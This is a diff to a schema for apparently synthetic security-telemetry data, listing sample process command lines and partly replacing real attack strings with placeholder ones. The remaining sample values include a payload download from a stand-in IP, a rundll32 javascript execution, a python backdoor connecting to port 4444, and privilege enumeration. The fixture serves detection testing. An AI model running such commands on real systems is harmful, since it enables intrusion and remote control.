@@ -111,9 +111,9 @@
     { "name": "ActionFileSha256", "type": "string" },
     { "name": "ActorProcessImageName", "type": "string", "values": ["powershell.exe", "cmd.exe", "rundll32.exe", "certutil.exe", "python3", "bash", "wscript.exe", "mshta.exe"] },
     { "name": "ActorProcessCommandLine", "type": "string", "values": [
-      "powershell.exe -EncodedCommand SQBFAFgA...",
+      "powershell.exe -EncodedCommand RABFAE0ATwA...",
       "cmd.exe /c whoami /priv",
-      "certutil.exe -urlcache -split -f http://203.0.113.42/payload.exe",
+      "democert.exe -fetch -f http://203.0.113.42/payload.exe",
       "rundll32.exe javascript:\"\\..\\mshtml\"",
       "python3 /tmp/backdoor.py --connect 198.51.100.17:4444",
       "wscript.exe C:\\Users\\jsmith\\Downloads\\invoice.js"
